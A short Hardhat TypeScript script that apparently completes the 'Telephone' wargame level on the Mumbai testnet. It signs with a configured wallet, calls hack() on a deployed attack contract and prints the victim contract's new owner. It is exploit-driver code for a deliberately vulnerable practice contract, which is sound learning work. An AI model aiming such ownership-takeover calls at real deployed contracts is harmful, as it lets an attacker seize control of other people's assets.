import { ethers } from 'hardhat'
import { TelephoneHack__factory, Telephone__factory } from '../typechain'

import { config } from '../secrets.config'

const MUMBAI_RPC = 'https://rpc-mumbai.maticvigil.com'
const provider = new ethers.providers.JsonRpcProvider(MUMBAI_RPC)

const instanceAddr = '0xe350Ff70BbF9dB9608Fc1a4BB2796688c8B44Bff'
const hackContractAddr = '0x1BfD6C90e049FcB5a52BC25F8b614eD70a56Ea1E'

async function hack() {
  const signer = new ethers.Wallet(config.PRIVATE.MAIN[0], provider)
  const contractInstance = Telephone__factory.connect(instanceAddr, provider)
  const contractHackSigner = TelephoneHack__factory.connect(hackContractAddr, signer)
  
  await (await contractHackSigner.hack()).wait()
  console.log("owner:", await contractInstance.owner());
}

hack()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })
